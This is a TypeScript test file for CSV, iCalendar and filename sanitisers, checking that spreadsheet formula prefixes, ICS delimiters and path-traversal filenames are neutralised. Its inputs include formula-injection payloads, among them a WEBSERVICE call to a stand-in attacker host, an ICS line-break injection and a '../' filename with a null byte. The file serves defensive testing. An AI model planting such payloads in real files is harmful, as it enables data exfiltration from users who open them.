import { csvCell, neutralizeSpreadsheetFormula } from '@/core/integrations/csvSecurity';
import { escapeIcsText, rowsToCsv, safeDownloadFilename } from '@/utils/download';

describe('export injection defenses', () => {
  it.each(['=2+2', '+SUM(A1:A2)', '-10+20', '@cmd', ' \t=HYPERLINK("x")'])(
    'neutralizes spreadsheet formula prefix %s',
    (value) => {
      expect(neutralizeSpreadsheetFormula(value)).toBe(`'${value}`);
      expect(csvCell(value).replaceAll('""', '"')).toContain(`'${value}`);
    },
  );

  it('applies formula neutralization to user-facing CSV downloads', () => {
    const csv = rowsToCsv([
      ['Customer', 'Amount'],
      ['=WEBSERVICE("https://attacker.invalid")', 100],
    ]);
    expect(csv).toContain(`"'=WEBSERVICE(""https://attacker.invalid"")"`);
    expect(csv.endsWith('\r\n')).toBe(true);
  });

  it('escapes all RFC 5545 text delimiters and line breaks', () => {
    expect(escapeIcsText('A\\B; C,D\r\nInjected:yes')).toBe('A\\\\B\\; C\\,D\\nInjected:yes');
  });

  it('creates a bounded filename without path or control characters', () => {
    expect(safeDownloadFilename('../JOB:1048\u0000?.ics')).toBe('JOB-1048-.ics');
    expect(safeDownloadFilename('...')).toBe('storyops-export');
  });
});
